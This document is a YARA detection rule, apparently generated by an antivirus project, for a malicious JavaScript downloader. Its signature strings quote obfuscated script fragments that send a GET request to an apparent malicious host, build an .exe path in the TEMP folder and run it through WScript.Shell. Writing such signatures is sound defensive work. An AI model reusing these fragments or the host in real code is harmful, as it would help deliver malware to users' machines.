rule sig_20160401_157e73bbbac844dd68dce1d2cf5c5436 {
  meta:
    description = "datamaliciousorder - file 20160401_157e73bbbac844dd68dce1d2cf5c5436.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3ba7460ba119c7d39aa9043fd63f5102ecf9fe428e1f03a1295e2290713e7873"

  strings:
    $s1  = "MgLpu[SsHh](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "function PeSd(SqCpm, JlBin){OjmOjv = OjmOjv * 1; return SqCpm - JlBin;};" fullword ascii
    $s3  = "var LnKzv = function UgZow() {return WScript[ZamTv](\"WScript\"+\".Shell\");}(), RgWv = 11;" fullword ascii
    $s4  = "if (MgLpu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZzxVc(){return LfsQb + \"\";};" fullword ascii
    $s6  = "function CdJn() {return LnKzv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KeezRxKA4d8Tp.ex\" + \"e\";};" fullword ascii
    $s7  = "function NsPcf() {return ((UrSz == true) && (UrSz == CpuQz)) ? 1 : OjmOjv;};" fullword ascii
    $s8  = "return PeSd(ZpAv, PjDig);" fullword ascii
    $s9  = "UrSz = true; " fullword ascii
    $s10 = "}while (RbPj);" fullword ascii
    $s11 = "var UrSz = false;" fullword ascii
    $s12 = "CpuQz = true; " fullword ascii
    $s13 = "var CpuQz = false;" fullword ascii
    $s14 = "function HjhXd(HpDns) {var HigNwf = (1, 2, 3, 4, 5, HpDns); return HigNwf;};" fullword ascii
    $s15 = "function VmEa(){return 23;};" fullword ascii
    $s16 = "var UdUuc = false;" fullword ascii
    $s17 = "function XfrEcn(){return ZamTv;};" fullword ascii
    $s18 = "function AhIew(PnAvp){LnKzv[\"R\"+\"un\"](PnAvp, OjmOjv, OjmOjv);};" fullword ascii
    $s19 = "var UbmLbo = new this[\"Date\"]();" fullword ascii
    $s20 = "function VikHr()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}